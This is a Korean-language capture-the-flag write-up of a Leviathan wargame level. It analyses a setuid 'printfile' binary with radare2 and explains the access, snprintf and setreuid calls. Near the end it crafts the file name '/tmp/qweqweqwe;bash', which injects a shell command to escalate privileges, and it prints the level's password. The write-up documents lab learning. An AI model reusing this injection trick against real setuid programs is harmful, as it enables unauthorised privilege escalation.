filename 이라는 파일이 보인다 .

r2 filename 을 해본다
$ aaaaa
$ pdf @main
을 하니 이전보다 훨씬긴 어셈블리어가 보인다.

이중에 int access(const *path, int mode) 가 보인다. 이함수가 머지?
access(path, mode) 함수는 파일이나 디렉토리의 파일이 존재하는지 읽기나, 쓰기, 실행이 가능한지 여부
를 판단해준다. R_OK, W_OK, X_OK, F_OK 로 

lea는 유호주소를 레지스터에 저장
쉽게 mov와 약간 비슷하다고 생각해라. 
snprintf함수는 머일까? -> 지정한 길이만큼 버퍼에 해당 문자열을 각 길이만큼 출력해준다.
버퍼오버플로우가 생기지 않는다.

geteuid : 사용자의 유호 ID를 반환한다.
setreuid : 실제 혹은 유호 사용자 ID를 설정한다. ( 현재 ID -> 유효한 사용자 ID로 설정 
system () : 

$ ./printfile /etc/leviathan_pass   #를 하니 /bin/cat 실행이 되며 디렉토리라는 것을 알려준다.

도움요청!
https://www.youtube.com/watch?v=R2gf1fHRjhI&list=PLilfVAwqeInU7x4gDwWdRlQ-41ta3HhAp

중요한 키 포인트는 setreuid 이런것은 파일이 setuid로 설정돼있어서 이것이 파일을 실행할동안 그 
권한으로 실행하는 어셈블리어이라는 것. 
중요한 것은 ; 가 코드를 동시에 같이 실행할수 있게 하는 것이다. bash 

# echo "levi" > "/tmp/qweqweqwe;bash"
# ls "/tmp/qweqweqwe;bash"
# ./printfile "/tmp/qweqweqwe;bash"
 로 진행을 하면은 권한이 leviathan3로 된것을 알수 있따.
 
 키 값 : Ahdiemoo1j

 
